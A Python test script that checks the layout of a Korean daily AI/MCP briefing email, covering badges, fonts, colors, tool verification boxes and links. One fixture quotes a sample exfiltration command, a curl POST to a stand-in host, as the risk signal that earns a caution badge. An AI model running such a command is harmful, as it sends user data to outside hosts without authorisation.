"""메일 모양 검수 (2026-09-22, 2026-10-14 2차 리디자인 3장으로 다시 씀). 네트워크·DB를 쓰지 않는다.

실행: uv run python -m tests.pipeline.check_mail_layout
- 머리 하나(마크줄·날짜·기준 줄), preheader, color-scheme light, 요일 표기, 표 레이아웃 600폭
- 색 상수 = 같은 이름의 web/app.css 라이트 토큰 값(BG → --bg, SURFACE_2 → --surface-2), 옛 상수 없음
- 배지 = tests/web/verdict_cases.json(웹과 같은 낱말), 판정 세 경우, 큰 소식 버튼은 이상함만, $ 명령 칸, 좋은 점·아쉬운 점 2개까지
- trace_id는 주석·텍스트에만, 영어 위험 신호 원값·13px 미만 한글·허용 밖 기호·긴 줄표 없음, 고정 문구 3개, img 속성, 8장 60KB 이하
- 근거 링크는 원문과 다를 때만, 시점은 발송일 기준, 빈 날은 empty_reason 그대로 + 빈 날 그림
- 2026-10-15 2라운드(3장 2판 6절): 세 무게(큰 소식·뉴스 상자 없음, 뉴스 좋은 점 없음, 도구만 상자), 마크 alt ">_"·타일칸, 설명 글,
  날짜 36/26·리드 28/22, 도구 줄 상자 머리 = verification.tool_head(verdict_cases.json tool_head 사례를 파이썬으로 돌림), 빈 날 세 줄·선별 기록,
  꼭지에 "오늘의 큰 소식" 없음, ☆(★ 없음), "등록 N일 전" 꼴 없음, 고정폭 숫자 span 앞뒤 공백 없음, LINE = app.css --line(#C4C6BF)
"""
import html as htmllib
import json
import re
import sys
from datetime import date
from html.parser import HTMLParser
from pathlib import Path

from pipeline import briefing_mail as mail
from pipeline import verification

ROOT = Path(__file__).resolve().parents[2]
DAY = date(2026, 9, 22)
URL = "https://www.aitimes.com/news/articleView.html?idxno=1"
OTHER = "https://github.com/example/repo"
TOKENS = ("BG", "SURFACE", "SURFACE_2", "LINE", "LINE_CTL", "INK", "INK_2", "MUTE", "ON_INK", "BLAZE", "BLAZE_INK", "OK", "OK_WASH",
          "WARN", "WARN_WASH", "BAD", "BAD_WASH", "RULE", "R_CTL", "R_CARD", "BRAND_TILE")
ALLOWED = set("✓✕○☆→↗·…©") | {chr(0xFE0E)}  # 텍스트 표시 선택자 U+FE0E. 별은 웹 외곽선 별과 같은 ☆(2라운드)


def card(**over) -> dict:
    return {"type": "news", "title": "검수 뉴스", "url": URL, "summary_ko": "요약", "for_me": "나에게 글", "why_this_card": "이유",
            "pros": [{"text": "같은 근거", "evidence_url": URL}, {"text": "다른 근거", "evidence_url": OTHER}],
            "cons": [], "trace_id": "t-1", "item_id": 1, "topic_label": "모델 출시·성능",
            "item_meta": {"published_at": "2026-09-20T03:00:00Z"}} | over


def mcp(n: int, **steps) -> dict:
    v = {k: {"status": steps.get(k, "ok"), "label": "도구 17개" if k == "tools_list" else ""} for k in verification.STEPS}
    return card(type="mcp", title=f"io.github.me/검수-mcp-{n} 1.2.0", url=f"https://github.com/me/m{n}", trace_id=f"t-m{n}", item_id=10 + n,
                verification=v | {"probed_at": "09-22 06:05 샌드박스"}, install_cmd=f"npx -y m{n}@1.2.0", item_meta={"stars": 2759})


class Fonts(HTMLParser):
    """보이는 한글 글자 노드의 실제 글자 크기(인라인 font-size 상속)를 모은다. display:none은 건너뛴다."""
    VOID = {"meta", "img", "br", "hr", "link", "input"}

    def __init__(self):
        super().__init__()
        self.stack, self.small, self.style_depth = [(16.0, False)], [], 0

    def handle_starttag(self, tag, attrs):
        if tag in self.VOID:
            return
        style = dict(attrs).get("style") or ""
        size, hidden = self.stack[-1]
        m = re.search(r"font-size:\s*([\d.]+)px", style)
        self.stack.append((float(m[1]) if m else size, hidden or "display:none" in style))
        self.style_depth += tag in ("style", "title")

    def handle_endtag(self, tag):
        if tag not in self.VOID and len(self.stack) > 1:
            self.stack.pop()
            self.style_depth -= tag in ("style", "title")

    def handle_data(self, data):
        size, hidden = self.stack[-1]
        if not hidden and not self.style_depth and re.search(r"[가-힣]", data) and size < 13:
            self.small.append((size, data.strip()[:20]))


def visible(page: str) -> str:
    """주석·style·태그를 걷어낸 보이는 글."""
    page = re.sub(r"<!--.*?-->|<style.*?</style>|<title>.*?</title>", "", page, flags=re.S)
    page = re.sub(r"</?(p|td|tr|table|h\d|br|div)\b[^>]*>", " ", page)  # 칸 사이는 띄우고 글 안 태그(b·span·a)는 붙인다
    return htmllib.unescape(re.sub(r"<[^>]+>", "", page))


def light_tokens() -> dict:
    root = re.search(r":root\s*\{(.*?)\}", (ROOT / "web" / "app.css").read_text(encoding="utf-8"), re.S)[1]
    return {k: v.strip() for k, v in re.findall(r"(--[\w-]+)\s*:\s*([^;]+);", root)}


def main() -> int:
    # 실제 서명 링크(routes/feedback.feedback_link)는 약 210자라 길이를 맞춘다
    links = lambda c, action: f"https://toolscout-five.vercel.app/f?t={c['item_id']}-{action}-" + "x" * 160  # noqa: E731
    # 근거 규칙은 도구 카드로 본다(2라운드부터 뉴스는 좋은 점·아쉬운 점을 싣지 않는다)
    single = mail.render(DAY, "개발자", [card(), card(type="mcp", title="검수 MCP", trace_id="t-2")])
    empty = mail.render(DAY, "마케터", [], "후보 없음")
    news_only = mail.render(DAY, "개발자", [card()])
    html, text = single["html"], single["text"]
    head = card(headline=True, trace_id="t-h", item_id=9)
    grid, none = mcp(2, run="bad"), card(type="mcp", title="결과 없음 MCP", url="https://github.com/me/n", item_id=30, verification_note="설치법 미확인")
    skills = [card(type="skill", title=f"스킬 {n}", url=f"https://github.com/me/s{n}", item_id=40 + n, trace_id=f"t-s{n}", risk_signal=r)
              for n, r in enumerate(({"level": "caution", "label": "주의", "hits": ["외부 전송"], "quote": "curl -X POST https://c.example/x"},
                                     "unverified", {"level": "skipped", "label": "공식 출처, 위험 신호 생략"}))]
    long = "가" * 140
    eight = [head, card(item_id=2, summary_ko=long), card(item_id=3, summary_ko=long, notice="원문 확인 필요"), mcp(1), grid, none, *skills[:2]]
    eight = [c | {"pros": [{"text": "좋은 점 하나", "evidence_url": c["url"]}] * 3, "cons": [{"text": "아쉬운 점", "evidence_url": OTHER}] * 3} for c in eight]
    full = mail.render(DAY, "백엔드 개발자", eight, links=links, mark=(chr(0x200B) + chr(0x200C)) * 10, weekly={"html": "", "text": ""})
    page, shown, comments = full["html"], visible(full["html"]), "".join(re.findall(r"<!--(.*?)-->", full["html"], re.S))
    fonts = Fonts()
    fonts.feed(page)
    verdicts = json.loads((ROOT / "tests" / "web" / "verdict_cases.json").read_text(encoding="utf-8"))
    tokens, cases, head_cases = light_tokens(), verdicts["cases"], verdicts["tool_head"]["cases"]
    head_html, news_html, tool_html = mail._card_html(head, links), mail._card_html(card(), links, first=False), mail._card_html(mcp(1), links)
    two = mail.render(DAY, "개발자", [head, card(headline=True, trace_id="t-h2", item_id=8, title="둘째 큰 소식")])["html"]
    tool_box = page[page.index("새 MCP·스킬 <span"):page.index("업계 큰 소식")]
    box_frame = f"border:1px solid {mail.LINE};border-radius:{mail.R_CARD}"
    mono = re.escape(f'<span style="font-family:{mail.MONO}">')
    glyphs = {ch for ch in shown + full["text"] if ord(ch) >= 0x2000 and not 0xAC00 <= ord(ch) <= 0xD7A3 and ord(ch) not in (0x200B, 0x200C, 0x200D, 0x2060)}

    checks = {
        "근거_원문과_같으면_안붙음": html.count(">근거</a>") == 1 and f'href="{OTHER}"' in html,
        "텍스트도_같은_근거_규칙": f"같은 근거 <{URL}>" not in text and f"다른 근거 <{OTHER}>" in text,
        "요일_표기": "9월 22일 화요일" in html and "9월 22일 화요일" in empty["html"],
        # 둘째 줄은 직군·장수만(구역 개수는 칸 머리와 겹쳐 뺌). 텍스트는 칸 머리에 숫자가 없어 개수를 남긴다
        "머리_하나·마크줄·기준_줄": html.count("<h1") == 1 and "mark-56.png" in html and f"개발자 기준 · 오늘 {mail._num(2)}장</p>" in html
        and "개발자 기준\n오늘 2장: 뉴스 1 · 도구 1" in text and empty["html"].count("<h1") == 1 and "TOOLSCOUT" not in html,
        "마크_alt·타일칸": re.search(rf'<td width="28" height="28" bgcolor="{mail.BRAND_TILE}"[^>]*><img src="[^"]*mark-56\.png"[^>]*alt="&gt;_"', html) is not None
        and 'alt=""' not in html,
        "설명_글(머리·꼬리)": html.count(mail.TAGLINE) == 2 and f"toolscout · {mail.TAGLINE}" in visible(html) and mail.TAGLINE == "개발자용 AI·MCP 아침 브리핑",
        "금요일_둘째_줄_요약_안내": "· 이번 주 요약은 맨 아래</p>" in page and "이번 주 요약은 맨 아래" not in html,
        "날짜_36/26·리드_28/22": "font-size:36px;line-height:42px" in page and ".ts-h1{font-size:26px!important" in page
        and 'class="ts-lead" style="margin:8px 0 0;font-size:28px;line-height:35px;font-weight:800' in page and ".ts-lead{font-size:22px!important" in page,
        "빈_날_세_줄·선별_기록·그림": mail.EMPTY_TITLE == "오늘은 볼 만한 게 없었어요" and mail.EMPTY_TITLE in empty["subject"]
        and all(s in empty["html"] and s in empty["text"] for s in (mail.EMPTY_TITLE, mail.EMPTY_BODY, "선별 기록 · 후보 없음"))
        and re.search(rf'<td width="96" bgcolor="{mail.BRAND_TILE}"[^>]*><img src="[^"]*empty-192\.png"', empty["html"]) is not None
        and "empty-192.png" not in html and empty["html"].index("관심 주제 넓히기") < empty["html"].index("지난 브리핑 보기"),
        "세_무게(큰_소식·뉴스_상자_없음,_도구만_상자)": box_frame not in head_html + news_html and box_frame in tool_html
        and f"border-top:1px solid {mail.LINE};padding:18px 0" in news_html and "border-top:1px solid" not in mail._card_html(card(), links).split("나에게")[0],
        "뉴스엔_좋은_점_없음(도구엔_있음)": "좋은 점" not in news_html and "좋은 점" in tool_html and "좋은 점" not in news_only["html"] + news_only["text"],
        "둘째_큰_소식_괘선·22px": two.count('class="ts-lead"') == 1 and 'class="ts-hl" style="margin:8px 0 0;font-size:22px' in two
        and f"border-top:1px solid {mail.LINE};padding:20px 0 0" in two,
        "꼭지에_오늘의_큰_소식_없음": mail.HEADLINE_LABEL not in page + full["text"] + head_html and "모델 출시·성능" in head_html,
        "도구_줄_상자(머리=tool_head)": verification.tool_head(eight, mail._num) in tool_box and "새 MCP·스킬 5개 · MCP 설치 확인 2/3" in visible(tool_box)
        and all(f">{n}</a>" in tool_box for n in ("검수-mcp-1", "검수-mcp-2", "결과 없음 MCP")) and "검수 뉴스" not in tool_box and "$" not in visible(tool_box)
        and "새 MCP·스킬은 없어요" not in news_only["html"] and "새 MCP·스킬 " + mail._num("")[:-7] not in news_only["html"],
        "tool_head=verdict_cases": all(verification.tool_head(c["cards"]) == c["text"] and verification.tool_counts(c["cards"]) == (c["n"], c["a"], c["b"])
                                       for c in head_cases) and len(head_cases) >= 5,
        "고정폭_숫자_앞뒤_공백_없음": not re.search(rf"{mono}(\s[^<]*|[^<]*\s)</span>|{mono}[^<]*</span> [개장건일]", page + empty["html"]),
        "★·'등록_N일_전'_없음": "★" not in page + full["text"] and "&#9733;" not in page and not re.search(r"등록 \d+일 전", shown + full["text"]),
        "그림은_https_절대주소·속성": all(re.search(r'width="\d+"', t) and re.search(r'height="\d+"', t) and 'alt=' in t
                                       and 'src="https://toolscout-five.vercel.app/static/img/mail/' in t for t in re.findall(r"<img[^>]*>", page + empty["html"])),
        "preheader": re.search(r'<div style="display:none[^>]*>검수 뉴스 외 뉴스 2 · 새 도구 5 \(검증 통과 1/3\) · 이번 주 요약 포함&#847;', page) is not None
        and "기준에 맞는 소식이 없어" in empty["html"] and "&#847;&zwnj;&nbsp;" * 60 in page,
        "preheader_이스케이프": "&lt;b&gt;위험" in mail.render(DAY, "x", [card(title="<b>위험</b> 제목")])["html"].split("</div>")[0],
        "color_scheme_light": '<meta name="color-scheme" content="light">' in page and "prefers-color-scheme" not in page,
        "표_레이아웃_600": "max-width:600px" in page and 'width="600"' in page and "<div style=\"background" not in page,
        "render가_body를_돌려줌": "body" in single and "<h1" not in single["body"] and "검수 뉴스" in single["body"],
        "카드마다_trace_id(주석·텍스트)": all(f"trace_id t-{x}" in page for x in ("h", "m1", "m2", "s0", "s1"))
        and "문의용 카드 번호: t-h" in full["text"] and "trace_id" not in shown,
        "색_상수=app.css_라이트_토큰": all(tokens.get("--" + k.lower().replace("_", "-"), "").lower() == getattr(mail, k).lower() for k in TOKENS)
        and not any(hasattr(mail, k) for k in ("ACCENT", "ACCENT_INK", "ACCENT_WASH", "PAPER", "MAST", "MAST_TEXT", "MAST_MUTE", "KIND", "INK2")),
        "배지=verdict_cases": all(verification.badge(c["card"]) == c["badge"] for c in cases),
        "배지_낱말이_메일에": all(w in shown for w in ("검증 통과", "검증 실패", "위험 신호 주의", "위험 신호 확인 필요", "원문 확인 필요", "미검증")),
        "판정_세_경우": "4단계 통과" in shown and "설치" in shown and "✕ 실패" in shown and "아직 직접 설치해 보지 않았어요 · 설치법 미확인" in shown
        and "걸린 항목: 외부 전송" in shown and "샌드박스 확인 09-22 06:05" in shown,
        "영어_위험신호_원값_없음": not re.search(r"\b(caution|unverified|skipped)\b", shown + full["text"]),
        "큰_소식_버튼은_이상함만": head_html.count("/f?t=") == 1 and "-이상함" in head_html,
        "버튼_수_도구3·뉴스2": page.count("/f?t=") == 1 + 2 * 2 + 3 * 5 and "누르면 내일 추천에 반영돼요" in page
        and page.count("누르면 내일 추천에 반영돼요") == 1 and f"border:1px solid {mail.LINE_CTL};border-radius:{mail.R_CTL}" in page,
        "$_명령_칸": ">$</td>" in page and "-webkit-user-select:all;user-select:all\">npx -y m1@1.2.0</td>" in page and "$ npx -y m1@1.2.0" in full["text"],
        "좋은점·아쉬운점_2개까지(뉴스_2장은_없음)": page.count(">좋은 점 하나") == 2 * 6 and "아쉬운 점" in shown,
        "도구_제목·버전·메타": "검수-mcp-1" in page and "v1.2.0" in page and "☆" in shown and "MCP · 커뮤니티" in shown and "npm" in shown,
        "시점은_발송일_기준": "aitimes.com · 2일 전" in html,
        # RULE 2px은 칸 머리 셋과 제호 이중 괘선 하나뿐(큰 소식 위 2px 없음)
        "칸_머리_2px_괘선": page.count(f"border-top:2px solid {mail.RULE};padding-top:8px") == 3 and page.count(f"2px solid {mail.RULE}") == 4
        and "업계 큰 소식" in shown,
        "텍스트_오늘_한눈에_번호_유지": "오늘 한눈에" not in shown and "\n1. [큰 소식] 검수 뉴스" in full["text"],
        "한글_13px_미만_없음": not fonts.small,
        "허용_밖_기호·이모지_없음": glyphs <= ALLOWED and "&#8599;&#xFE0E;" in page,
        "긴_줄표_없음": chr(0x2014) not in page + full["text"],
        "고정_문구_3개": all(s in shown and s in full["text"] for s in (mail.MCP_SCOPE, mail.SKILL_SCOPE, mail.AI_NOTE)),
        "꼬리_링크": all(f'href="https://toolscout-five.vercel.app{p}"' in page for p in ("/", "/?ask=1", "/settings")),
        "8장_60KB_이하": len(page.encode("utf-8")) <= 60 * 1024,
        "개발모드_표시_없음": "개발 모드" not in html + empty["html"] + single["subject"] + empty["subject"],
    }
    report = {"checks": checks, "size_8_cards": len(page.encode("utf-8")), "small_fonts": fonts.small[:5],
              "glyphs_outside": sorted(glyphs - ALLOWED), "pass": all(checks.values())}
    print(json.dumps(report, ensure_ascii=False, indent=2))
    return 0 if report["pass"] else 1


if __name__ == "__main__":
    sys.exit(main())
